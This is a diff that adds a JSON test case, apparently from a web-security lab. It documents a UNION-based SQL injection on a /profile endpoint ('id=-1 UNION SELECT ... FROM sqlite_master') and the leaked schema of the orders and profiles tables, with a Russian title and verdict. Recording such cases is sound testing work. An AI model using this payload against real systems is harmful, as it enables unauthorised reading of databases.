@@ -1,0 +1,21 @@
+{
+  "name": "01b_sqli_profile_union",
+  "title": "SQL-инъекция UNION: чтение схемы БД",
+  "request": "GET /profile?id=-1 UNION SELECT 1,sql,3,4 FROM sqlite_master",
+  "status": 200,
+  "response": [
+    {
+      "id": 1,
+      "name": "CREATE TABLE orders(id INTEGER PRIMARY KEY, owner INTEGER, product TEXT, price REAL)",
+      "email": 3,
+      "address": 4
+    },
+    {
+      "id": 1,
+      "name": "CREATE TABLE profiles(id INTEGER PRIMARY KEY, name TEXT, email TEXT, address TEXT)",
+      "email": 3,
+      "address": 4
+    }
+  ],
+  "verdict": "Через UNION читается структура БД / произвольные таблицы"
+}
